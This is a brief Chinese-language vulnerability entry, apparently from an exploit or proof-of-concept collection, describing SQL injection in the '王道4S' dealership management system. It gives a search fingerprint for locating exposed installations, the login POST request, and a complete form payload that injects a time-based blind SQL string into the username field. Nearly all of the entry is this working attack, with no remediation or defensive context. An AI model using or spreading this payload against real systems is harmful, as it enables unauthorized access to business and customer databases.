# 王道4S管理系统SQL注入漏洞

王道4S管理系统 ｜ SQL注入 ｜ —
- **指纹**：`web.body="PixelsPerInch"`
- **请求**：`POST / HTTP/1.1`

**Payload**
```
ScriptManager1=UpdatePanel3btnLogin&__EVENTTARGET=btnLogin&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=&ddlUserName=&txtUserName=1';WAITFOR DELAY '0:0:5'--&txtPassWord=1&cbBossedBroadcast=on&txtMACAddr=&__ASYNCPOST=true&
```
- **响应特征**：200